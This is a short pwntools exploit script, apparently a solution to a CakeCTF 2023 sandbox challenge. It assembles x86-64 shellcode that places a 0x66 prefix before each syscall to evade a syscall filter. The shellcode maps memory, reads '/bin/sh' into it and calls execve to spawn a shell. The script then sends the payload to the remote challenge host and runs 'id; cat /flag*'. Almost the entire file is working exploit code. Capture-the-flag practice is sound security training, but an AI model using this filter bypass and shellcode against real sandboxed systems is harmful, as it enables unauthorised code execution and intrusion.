from pwn import *
context.update(arch="amd64", os="linux")
context.log_level = "info"

# we will just use the 0x66 size prefix to pass the syscall filtering
# we just need to mmap a memory zone, and read "/bin/sh" string in it first, then execve('/bin/sh', 0, 0)
shellc = asm('''
      mov edi,0x10000
      mov esi, 4096
      push 3
      pop rdx
      push 0x22
      pop r10
      xor r8,r8
      xor r9,r9
      push 9
      pop rax
      .byte 0x66
      syscall

      mov esi,eax
      xor edi,edi
      xor eax,eax
      push 8
      pop rdx
      .byte 0x66
      syscall

      mov rdi,rsi
      xor esi,esi
      xor edx,edx
      push 59
      pop rax
      .byte 0x66
      syscall
      push 60
      pop rax
      syscall


''')

if args.REMOTE:
  p = remote('others.2023.cakectf.com', 10001)
else:
  p = process('python3 sandbox.py', shell=True)

p.sendlineafter('shellcode: ', enhex(shellc))
p.send('/bin/sh\x00')

p.sendline('id; cat /flag*')

p.interactive()

